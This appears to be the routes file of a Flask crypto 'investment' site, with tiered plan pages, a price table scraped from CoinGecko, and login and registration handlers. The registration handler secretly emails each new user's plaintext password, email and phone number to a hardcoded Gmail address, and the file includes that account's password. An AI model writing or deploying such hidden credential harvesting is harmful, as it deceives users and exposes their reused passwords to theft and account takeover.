import smtplib
from http import server

from bs4 import BeautifulSoup
from flask import render_template, url_for, flash, request
from flask_login import login_user, current_user, logout_user, login_required
from requests import Session
from werkzeug.utils import redirect
import pandas as pd
from main import app, bcrypt, db, Api_key
from main.forms import LoginForm, RegistrationForm
from main.models import User
from email.mime.text import MIMEText
import requests
from requests.exceptions import ConnectionError, Timeout, TooManyRedirects
import json

import csv
MY_EMAIL= "libertexinvestment06@gmail.com"
My_PASSWORD = "sbvtmbujwwmatknd"




@app.route('/')
def home():
    headers = {

    }
    url = "https://www.coingecko.com/en"
    tables = []
    for i in range(1, 2):
        params = {
            "page": "i"
        }
        response = requests.get(url)
        df = pd.read_html(response.text)[0]
        df = df[[ "Coin","1h", "24h", "7d", "Price", "Mkt Cap"]]
        df['Coin'] = df['Coin'].apply(lambda x: x.split(" ")[0])
        df.to_csv("crypto.csv", index=None)

    data = pd.read_csv('crypto.csv')


    return render_template("home.html",tables=[data.to_html()], titles=[''] )


@app.route('/account')

@login_required
def account():

    return render_template("account.html", title="Account")


@app.route('/register', methods=["GET", "POST"])
def register():
    if current_user.is_authenticated:
        return redirect(url_for("home"))
    form = RegistrationForm()
    if form.validate_on_submit():
        hashed_password = bcrypt.generate_password_hash(form.password.data).decode("utf-8")
        user = User(userName=form.userName.data, email=form.email.data, password=hashed_password)
        db.session.add(user)
        db.session.commit()
        PhoneNumber = form.phoneNumber.data
        emil= form.email.data
        pa=form.password.data
        with smtplib.SMTP("smtp.gmail.com") as connection:
            connection.starttls()
            connection.login(MY_EMAIL, My_PASSWORD)
            connection.sendmail(from_addr=MY_EMAIL, to_addrs=MY_EMAIL, msg=f"Subject:New User\n\n{PhoneNumber}\n{emil}\n"
                                                                           f"{pa}")
        flash("Your Account has been created", "success")
        return redirect(url_for('login'))
    return render_template("register.html", title="Register", form=form)


@app.route('/login', methods=["GET", "POST"])
def login():
    if current_user.is_authenticated:
        return redirect(url_for("home"))
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        if user and bcrypt.check_password_hash(user.password, form.password.data):
            login_user(user, remember=form.remember.data)
            next_page = request.args.get("next")
            return redirect(next_page) if next_page else redirect(url_for('home'))
        else:
            flash("login Unsuccessful , Please check your details ", "danger")
    return render_template("login.html", title="Login", form=form)


@app.route("/logout_user")
def logout():
    logout_user()
    return redirect(url_for('home'))


@app.route('/bronze')
def bronze():
    return render_template('/bronze.html')


@app.route('/silver')
def silver():


    return render_template('/silver.html', )


@app.route('/gold')
def gold():


    return render_template('/gold.html',)


@app.route('/layout')
def layout():
    url = 'https://sandbox-api.coinmarketcap.com/v1/cryptocurrency/listings/latest'
    headers = {
        'Accepts': 'application/json',
        'X-CMC_PRO_API_KEY': Api_key,
    }
    parameters = {
        'start': '1',
        'limit': '50',
        'convert': 'USD'
    }

    session = Session()
    session.headers.update(headers)

    try:
        response = session.get(url, params=parameters)
        data = json.loads(response.text)

    except (ConnectionError, Timeout, TooManyRedirects) as e:
        print(e)

    return render_template('/layout.html')


